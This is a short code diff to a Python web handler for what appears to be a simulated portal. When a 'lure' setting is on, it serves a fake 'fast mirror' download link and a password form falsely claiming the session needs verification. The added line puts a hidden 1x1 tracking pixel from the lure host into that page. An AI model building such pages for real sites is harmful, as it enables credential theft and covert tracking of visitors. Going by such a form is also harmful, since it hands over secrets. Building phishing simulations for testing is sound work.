@@ -265,6 +265,7 @@ class Handler(BaseHTTPRequestHandler):
         if portal.settings["lure"]:
             lure = (f"<p class='promo'><a class='big' href='{portal.settings['lure']}/mirror/{report_id}.xlsx'>"
                     "Download report (fast mirror)</a></p>"
+                    f"<img alt='' width='1' height='1' src='{portal.settings['lure']}/pixel.gif'>"
                     "<form method='post' action='/verify-password'><p>Your session needs verification before "
                     "downloading. Enter your password to continue.</p><label>Password <input type='password' "
                     "name='password'></label><button type='submit'>Verify and download</button></form>")
